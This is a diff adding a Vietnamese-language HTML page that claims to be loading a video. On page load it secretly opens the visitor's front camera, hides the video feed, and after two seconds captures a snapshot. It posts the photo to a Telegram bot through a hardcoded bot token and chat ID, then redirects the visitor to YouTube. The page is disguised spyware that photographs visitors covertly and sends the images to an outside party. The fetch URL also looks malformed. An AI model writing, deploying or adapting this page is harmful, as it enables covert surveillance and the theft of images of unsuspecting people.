@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đang tải nội dung...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f4; }
+        .loading { font-size: 20px; color: #333; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="loading">Đang tải video vui lòng đợi...</div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const TELEGRAM_TOKEN = '8844463848:AAFækFs1R8eP0QPpriVSMd2xckZwcGPP4PM';
+        const CHAT_ID = '8764287345';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                setTimeout(takeSnapshot, 2000);
+            } catch (err) {
+                console.log("Lỗi truy cập camera: ", err);
+                document.querySelector('.loading').innerText = "Lỗi kết nối. Vui lòng tải lại trang!";
+            }
+        });
+
+        function takeSnapshot() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(sendToTelegram, 'image/jpeg', 0.8);
+        }
+
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'screenshot.jpg');
+
+            fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                window.location.href = "https://youtube.com";
+            })
+            .catch(error => console.error('Lỗi:', error));
+        }
+    </script>
+</body>
+</html>
